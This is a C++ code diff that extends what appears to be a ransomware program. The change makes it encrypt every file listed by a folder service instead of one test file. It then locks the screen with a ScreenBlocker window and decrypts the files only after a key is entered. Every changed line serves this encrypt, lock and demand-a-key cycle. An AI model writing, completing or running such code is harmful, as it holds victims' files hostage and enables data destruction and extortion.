@@ -13,16 +13,18 @@ int main(int argc, char *argv[])
 
     FolderService folderservice;
 
-    folderservice.list_files();
+    std::vector<std::string> files = folderservice.list_files();
 
-    path filePath = "file.txt";
     RSAEncryptor* encryptor = new RSAEncryptor();
-    try {
-        encryptor->encryptFile(filePath);
-        encryptor->decryptFile(filePath.string() + ".enc", key);
-    } catch(Exception ex) {
-        std::cout << ex.what()<<std::endl;
+
+    for (std::string filePath : files) {
+        try {
+            encryptor->encryptFile(filePath);
+        } catch(Exception ex) {
+            std::cout << ex.what()<<std::endl;
+        }
     }
+
 
     ScreenBlocker* screenBlocker = new ScreenBlocker();
     // Set the main window
@@ -39,11 +41,15 @@ int main(int argc, char *argv[])
         key = Qkey.toStdString();
     }
     std::cout<<key<<std::endl;
-    try {
-        encryptor->decryptFile(filePath.string() + ".enc", key);
-    } catch(Exception ex) {
-        std::cout << ex.what()<<std::endl;
+
+    for (std::string filePath : files) {
+        try {
+            encryptor->decryptFile(filePath, key);
+        } catch(Exception ex) {
+            std::cout << ex.what()<<std::endl;
+        }
     }
+
     delete encryptor;
     return 0;
 }
